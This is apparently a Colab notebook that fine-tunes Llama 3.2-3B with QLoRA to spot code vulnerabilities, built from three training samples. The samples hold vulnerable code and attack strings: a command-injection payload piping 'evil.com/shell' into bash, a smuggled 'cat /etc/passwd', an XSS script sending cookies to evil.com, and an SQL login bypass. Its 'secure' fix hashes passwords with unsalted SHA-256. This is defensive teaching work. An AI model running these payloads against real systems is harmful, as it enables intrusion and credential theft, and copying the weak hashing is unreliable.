# 🛡️ CyberGuard — Fine-Tuning Llama 3.2-3B as a Code Security Analyst

**Fine-tune Llama 3.2-3B-Instruct with QLoRA (4-bit) to become an expert at:**
- Identifying code vulnerabilities (SQL Injection, XSS, Command Injection, etc.)
- Explaining real-world attacker impact
- Providing secure code rewrites
- Referencing CWE IDs and OWASP Top 10

**Stack:** Unsloth + PEFT + TRL + MLflow + Hugging Face

[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/)

---

> **GPU Required:** T4 (free) or A100 (Colab Pro). T4 training time: ~15-25 min for full run.
> **VRAM needed:** ~6GB (T4 has 16GB — comfortable)

## ⚙️ 1. Setup — Install Dependencies

In [ ]:
# Check GPU
!nvidia-smi

# Install Unsloth (optimized for Colab)
!pip install "unsloth[colab-new] @ git+https://github.com/unslothai/unsloth.git" -q

# Core dependencies
!pip install trl peft accelerate bitsandbytes transformers datasets -q
!pip install mlflow rouge-score bert-score pyyaml python-dotenv -q

print('✅ Installation complete!')

In [ ]:
import torch
import json
import os
import mlflow
from pathlib import Path
from datasets import load_dataset
from transformers import TrainingArguments, EarlyStoppingCallback
from trl import SFTTrainer
from unsloth import FastLanguageModel
from unsloth.chat_templates import get_chat_template

print(f'PyTorch: {torch.__version__}')
print(f'CUDA available: {torch.cuda.is_available()}')
if torch.cuda.is_available():
    print(f'GPU: {torch.cuda.get_device_name(0)}')
    print(f'VRAM: {torch.cuda.get_device_properties(0).total_memory / 1e9:.1f} GB')

## 🤗 2. HuggingFace Login (Optional — for Hub push)

In [ ]:
from google.colab import userdata
import os

# Set your HF token in Colab Secrets (key icon in left sidebar)
try:
    os.environ['HF_TOKEN'] = userdata.get('HF_TOKEN')
    print('✅ HF Token loaded from Colab Secrets')
except:
    print('⚠️  No HF_TOKEN found — model wont be pushed to Hub')
    print('   Add it via: Runtime > Manage Secrets > HF_TOKEN')

# Your HF username for model publishing
HF_USERNAME = 'your-username'  # ← CHANGE THIS
MODEL_NAME = f'{HF_USERNAME}/cyberguard-llama3-security-analyst'

## 📦 3. Build Training Dataset

In [ ]:
# Clone the project repo (or upload files manually)
# !git clone https://github.com/your-username/cyberguard-llm.git
# %cd cyberguard-llm

# For this notebook, we'll define the dataset inline
SYSTEM_PROMPT = """You are CyberGuard, an elite AI code security analyst.
When given code, you:
1. Identify ALL security vulnerabilities with precision
2. Explain the real-world IMPACT (what an attacker can do)
3. Provide a complete SECURE REWRITE
4. Reference CWE IDs and OWASP categories
5. Teach the developer WHY the fix works

Be concise, technical, and actionable. Always provide working code in fixes."""


def format_sample(vulnerable_code, language, vuln_type, cwe_id, owasp,
                  vuln_line, impact, secure_code, explanation, severity, refs):
    user = f"""Analyze this {language} code for security vulnerabilities:

```{language.lower()}
{vulnerable_code}
```

Provide: vulnerability type, affected line, impact, and a secure rewrite."""

    assistant = f"""## 🔴 Security Analysis Report

**VULNERABILITY:** {vuln_type} (`{cwe_id}`)
**SEVERITY:** {severity}
**OWASP:** {owasp}

---

### 📍 Vulnerable Line
```{language.lower()}
{vuln_line}
```

### 💥 Impact
{impact}

### ✅ Secure Rewrite
```{language.lower()}
{secure_code}
```

### 📚 Why This Fix Works
{explanation}

### 🔗 References
{chr(10).join(f'- {r}' for r in refs)}"""

    return (
        f"<|begin_of_text|>"
        f"<|start_header_id|>system<|end_header_id|>\n\n{SYSTEM_PROMPT}<|eot_id|>"
        f"<|start_header_id|>user<|end_header_id|>\n\n{user}<|eot_id|>"
        f"<|start_header_id|>assistant<|end_header_id|>\n\n{assistant}<|eot_id|>"
    )

print('Format function ready!')

In [ ]:
# ── Training Samples ──────────────────────────────────────────────
training_samples = []

# 1. SQL Injection
training_samples.append(format_sample(
    vulnerable_code="""import sqlite3
def get_user(username: str, password: str):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"
    cursor.execute(query)
    return cursor.fetchone()""",
    language='Python',
    vuln_type='SQL Injection',
    cwe_id='CWE-89',
    owasp='A03:2021 - Injection',
    vuln_line="query = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"",
    impact='Attacker can log in as ANY user with admin\'--. Can dump entire DB or drop tables.',
    secure_code="""import sqlite3, hashlib
def get_user(username: str, password: str):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = 'SELECT * FROM users WHERE username = ? AND password_hash = ?'
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    cursor.execute(query, (username, password_hash))
    return cursor.fetchone()""",
    explanation='Parameterized queries treat ? as data, not SQL. Even admin\'-- becomes a literal string.',
    severity='CRITICAL',
    refs=['https://owasp.org/Top10/A03_2021-Injection/', 'https://cwe.mitre.org/data/definitions/89.html']
))

# 2. Command Injection
training_samples.append(format_sample(
    vulnerable_code="""import os
from flask import Flask, request
app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host', 'localhost')
    result = os.popen(f'ping -c 4 {host}').read()
    return f'<pre>{result}</pre>'""",
    language='Python',
    vuln_type='OS Command Injection',
    cwe_id='CWE-78',
    owasp='A03:2021 - Injection',
    vuln_line="result = os.popen(f'ping -c 4 {host}').read()",
    impact='Attacker sends host=google.com;cat /etc/passwd. Gets reverse shell with host=x;curl evil.com/shell|bash',
    secure_code="""import subprocess, re
from flask import Flask, request, abort
app = Flask(__name__)
VALID_HOST = re.compile(r'^[a-zA-Z0-9.\-]{1,255}$')

@app.route('/ping')
def ping():
    host = request.args.get('host', 'localhost')
    if not VALID_HOST.match(host): abort(400)
    result = subprocess.run(['ping', '-c', '4', host],
                           capture_output=True, text=True, timeout=10, shell=False)
    return f'<pre>{result.stdout}</pre>'""",
    explanation='subprocess with list args bypasses the shell entirely. No ; or | interpretation. shell=False is critical.',
    severity='CRITICAL',
    refs=['https://owasp.org/Top10/A03_2021-Injection/', 'https://cwe.mitre.org/data/definitions/78.html']
))

# 3. XSS
training_samples.append(format_sample(
    vulnerable_code="""from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    html = f'<h1>Welcome, {name}!</h1>'
    return render_template_string(html)""",
    language='Python',
    vuln_type='Cross-Site Scripting (XSS)',
    cwe_id='CWE-79',
    owasp='A03:2021 - Injection',
    vuln_line="html = f'<h1>Welcome, {name}!</h1>'",
    impact='Attacker steals cookies via ?name=<script>document.location=\'evil.com/?c=\'+document.cookie</script>',
    secure_code="""from flask import Flask, request
from markupsafe import escape
app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    safe_name = escape(name)  # <> become &lt;&gt;
    return f'<h1>Welcome, {safe_name}!</h1>'""",
    explanation='escape() converts < > & to HTML entities. <script> becomes &lt;script&gt; — visible text, not code.',
    severity='HIGH',
    refs=['https://owasp.org/Top10/A03_2021-Injection/', 'https://cwe.mitre.org/data/definitions/79.html']
))

print(f'✅ Created {len(training_samples)} training samples')
print(f'\nSample preview (first 500 chars):')
print(training_samples[0][:500] + '...')

In [ ]:
import json
from pathlib import Path

# Save dataset
Path('data').mkdir(exist_ok=True)
dataset_path = 'data/security_instruct_dataset.jsonl'

with open(dataset_path, 'w') as f:
    for text in training_samples:
        f.write(json.dumps({'text': text}) + '\n')

print(f'✅ Dataset saved: {len(training_samples)} samples → {dataset_path}')

# Verify
from datasets import load_dataset
ds = load_dataset('json', data_files=dataset_path, split='train')
print(f'Dataset loaded: {ds}')

## 🤖 4. Load Model with QLoRA (4-bit)

In [ ]:
from unsloth import FastLanguageModel
from unsloth.chat_templates import get_chat_template

# ── Config ──────────────────────────────────────────────
BASE_MODEL = 'unsloth/Llama-3.2-3B-Instruct'
MAX_SEQ_LEN = 2048
LORA_R = 16
LORA_ALPHA = 32

print(f'Loading {BASE_MODEL} with 4-bit quantization...')

model, tokenizer = FastLanguageModel.from_pretrained(
    model_name=BASE_MODEL,
    max_seq_length=MAX_SEQ_LEN,
    dtype=None,           # Auto-detect (fp16 for T4)
    load_in_4bit=True,    # 4-bit NF4 quantization
)

# Apply LoRA adapters
model = FastLanguageModel.get_peft_model(
    model,
    r=LORA_R,
    target_modules=['q_proj', 'k_proj', 'v_proj', 'o_proj',
                    'gate_proj', 'up_proj', 'down_proj'],
    lora_alpha=LORA_ALPHA,
    lora_dropout=0.05,
    bias='none',
    use_gradient_checkpointing='unsloth',
    random_state=42,
)

# Apply Llama-3 chat template
tokenizer = get_chat_template(tokenizer, chat_template='llama-3')

# Count params
trainable = sum(p.numel() for p in model.parameters() if p.requires_grad)
total = sum(p.numel() for p in model.parameters())
print(f'\n✅ Model loaded!')
print(f'   Trainable params: {trainable:,} / {total:,} ({100*trainable/total:.2f}%)')
print(f'   VRAM used: {torch.cuda.memory_allocated()/1e9:.2f} GB')

## 🔍 5. Test Base Model (Before Fine-Tuning)

In [ ]:
# Test base model BEFORE training
FastLanguageModel.for_inference(model)

test_code = """def get_user(db, username, password):
    query = \"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\"
    return db.execute(query).fetchone()"""

prompt = (
    f'<|begin_of_text|>'
    f'<|start_header_id|>system<|end_header_id|>\n\n{SYSTEM_PROMPT}<|eot_id|>'
    f'<|start_header_id|>user<|end_header_id|>\n\nAnalyze this Python code for security vulnerabilities:\n\n'
    f'```python\n{test_code}\n```\n\nProvide: vulnerability type, affected line, impact, and a secure rewrite.<|eot_id|>'
    f'<|start_header_id|>assistant<|end_header_id|>\n\n'
)

inputs = tokenizer(prompt, return_tensors='pt').to(model.device)
with torch.no_grad():
    outputs = model.generate(**inputs, max_new_tokens=400, temperature=0.1, do_sample=True)

generated = outputs[0][inputs['input_ids'].shape[1]:]
base_response = tokenizer.decode(generated, skip_special_tokens=True)

print('=' * 60)
print('BASE MODEL RESPONSE (before fine-tuning):')
print('=' * 60)
print(base_response)

## 📊 6. Setup MLflow Tracking

In [ ]:
import mlflow
import time

# In Colab: use local file tracking (no server needed)
mlflow.set_tracking_uri('sqlite:///mlflow.db')
import os; os.environ['MLFLOW_ALLOW_FILE_STORE'] = 'true'
mlflow.set_experiment('cyberguard-qlora-training')

print('✅ MLflow configured (local file tracking)')
print('   Artifacts stored in: ./mlruns/')
print('   After training, run: mlflow ui --port 5000 (in terminal)')

## 🚀 7. Fine-Tune with QLoRA

In [ ]:
from transformers import TrainingArguments, EarlyStoppingCallback
from trl import SFTTrainer
import time

# Switch back to training mode
FastLanguageModel.for_training(model)

# Load dataset
ds = load_dataset('json', data_files=dataset_path, split='train')
split = ds.train_test_split(test_size=0.15, seed=42)

print(f'Train: {len(split["train"])} samples')
print(f'Eval:  {len(split["test"])} samples')

# Training config
training_args = TrainingArguments(
    per_device_train_batch_size=2,
    gradient_accumulation_steps=4,    # Effective batch = 8
    warmup_steps=5,
    num_train_epochs=3,
    learning_rate=2e-4,
    fp16=not torch.cuda.is_bf16_supported(),
    bf16=torch.cuda.is_bf16_supported(),
    logging_steps=5,
    optim='adamw_8bit',
    weight_decay=0.01,
    lr_scheduler_type='cosine',
    seed=42,
    output_dir='./outputs/checkpoints',
    save_strategy='epoch',
    eval_strategy='epoch',
    load_best_model_at_end=True,
    metric_for_best_model='eval_loss',
    report_to='mlflow',
)

trainer = SFTTrainer(
    model=model,
    tokenizer=tokenizer,
    train_dataset=split['train'],
    eval_dataset=split['test'],
    dataset_text_field='text',
    max_seq_length=MAX_SEQ_LEN,
    dataset_num_proc=2,
    packing=False,
    args=training_args,
)

# ── START TRAINING ──────────────────────────────────────────
print('\n🚀 Starting QLoRA training...')
print(f'   Model: {BASE_MODEL}')
print(f'   LoRA rank: {LORA_R} | Alpha: {LORA_ALPHA}')
print(f'   Learning rate: 2e-4 | Epochs: 3')

with mlflow.start_run(run_name=f'qlora-v{int(time.time())}') as run:
    mlflow.log_params({
        'base_model': BASE_MODEL,
        'lora_r': LORA_R,
        'lora_alpha': LORA_ALPHA,
        'learning_rate': 2e-4,
        'epochs': 3,
        'batch_size': 2,
        'grad_accumulation': 4,
        'quantization': '4bit-NF4',
    })

    start = time.time()
    result = trainer.train()
    elapsed = time.time() - start

    mlflow.log_metrics({
        'train_loss': result.training_loss,
        'train_time_seconds': elapsed,
    })
    mlflow_run_id = run.info.run_id

print(f'\n✅ Training complete in {elapsed:.0f}s ({elapsed/60:.1f} min)')
print(f'   Final train loss: {result.training_loss:.4f}')
print(f'   MLflow Run ID: {mlflow_run_id}')

## 🔍 8. Test Fine-Tuned Model (After Training)

In [ ]:
FastLanguageModel.for_inference(model)

inputs = tokenizer(prompt, return_tensors='pt').to(model.device)
with torch.no_grad():
    outputs = model.generate(**inputs, max_new_tokens=600, temperature=0.1, do_sample=True)

generated = outputs[0][inputs['input_ids'].shape[1]:]
finetuned_response = tokenizer.decode(generated, skip_special_tokens=True)

print('=' * 60)
print('FINE-TUNED MODEL RESPONSE:')
print('=' * 60)
print(finetuned_response)

print('\n' + '=' * 60)
print('COMPARISON:')
print('=' * 60)
print(f'Base model length:       {len(base_response)} chars')
print(f'Fine-tuned model length: {len(finetuned_response)} chars')
print(f'Base has CWE-89: {"CWE-89" in base_response}')
print(f'FT   has CWE-89: {"CWE-89" in finetuned_response}')
print(f'Base has code fix: {"```" in base_response}')
print(f'FT   has code fix: {"```" in finetuned_response}')

## 💾 9. Save & Export Model

In [ ]:
from pathlib import Path

# Save LoRA adapters only (small, ~50MB)
Path('outputs/lora_adapter').mkdir(parents=True, exist_ok=True)
model.save_pretrained('outputs/lora_adapter')
tokenizer.save_pretrained('outputs/lora_adapter')
print('✅ LoRA adapters saved → outputs/lora_adapter/')

# Merge LoRA into base model (full 16-bit, ~6GB)
Path('outputs/merged_model').mkdir(parents=True, exist_ok=True)
model.save_pretrained_merged('outputs/merged_model', tokenizer, save_method='merged_16bit')
print('✅ Merged model saved → outputs/merged_model/')

In [ ]:
# Push to HuggingFace Hub (requires HF_TOKEN)
if os.environ.get('HF_TOKEN'):
    print(f'Pushing to: {MODEL_NAME}')
    model.push_to_hub(MODEL_NAME, token=os.environ['HF_TOKEN'])
    tokenizer.push_to_hub(MODEL_NAME, token=os.environ['HF_TOKEN'])
    print(f'✅ Model published: https://huggingface.co/{MODEL_NAME}')
else:
    print('⚠️  Set HF_TOKEN to push to HuggingFace Hub')

## 📊 10. Results Table

In [ ]:
from rouge_score import rouge_scorer

test_cases = [
    {
        'name': 'SQL Injection',
        'expected_cwe': 'CWE-89',
        'expected_keywords': ['SQL Injection', 'parameterized'],
        'base_response': base_response,
        'ft_response': finetuned_response,
    }
]

scorer = rouge_scorer.RougeScorer(['rougeL'], use_stemmer=True)

print('\n📊 RESULTS TABLE')
print('=' * 80)
print(f'{"Test Case":<25} {"Model":<12} {"CWE Hit":<10} {"Has Fix":<10} {"ROUGE-L":<8}')
print('-' * 80)

reference = 'SQL Injection CWE-89 parameterized query vulnerability'

for case in test_cases:
    for label, resp in [("Base", case['base_response']), ("Fine-Tuned", case['ft_response'])]:
        cwe_hit = '✅' if case['expected_cwe'] in resp else '❌'
        has_fix = '✅' if '```' in resp else '❌'
        rouge = scorer.score(reference, resp)['rougeL'].fmeasure
        print(f'{case["name"]:<25} {label:<12} {cwe_hit:<10} {has_fix:<10} {rouge:.3f}')

print('=' * 80)

## 🚀 Next Steps

1. **Add more training data** — Add more vulnerability examples to `data/build_dataset.py`
2. **Deploy with vLLM** — Use `serving/docker-compose.yml` to spin up the inference API
3. **View MLflow UI** — `mlflow ui --port 5000` then open `http://localhost:5000`
4. **Run full evaluation** — `python evaluation/evaluate.py --base_model ... --finetuned_model ...`

### Hyperparameter Tuning Ideas:
- Try `lora_r=32` for better quality (more params)
- Try `learning_rate=1e-4` if loss is unstable
- Try `packing=True` in SFTTrainer for faster training
- Enable `use_rslora=True` for rank-stabilized LoRA